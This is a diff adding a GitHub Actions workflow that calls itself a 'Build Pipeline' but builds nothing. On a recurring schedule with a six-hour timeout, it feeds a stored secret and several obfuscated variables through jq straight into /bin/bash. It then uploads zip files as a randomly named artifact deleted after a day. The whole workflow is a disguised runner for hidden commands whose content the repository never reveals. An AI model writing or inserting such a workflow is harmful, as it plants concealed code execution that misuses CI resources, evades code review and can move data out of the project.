@@ -1,0 +1,35 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '59 1,7,13,19 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          m11: ${{ secrets.m11 }}
+        run: |
+          printf '%s' "$m11" | jq -r .gvgn65 | /bin/bash
+          echo $djpjq7 | jq -r .ph56784 | /bin/bash
+          printf '%s' "$bpxxc2713" | jq -r .xbdhg16 | /bin/bash
+          printf '%s' "$mhe9776" | jq -r .cnmo3130 | /bin/bash
+          printf '%s' "$inm61794" | jq -r .f7123 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: plhZXXzY
+          path: "*.zip"
+          retention-days: 1
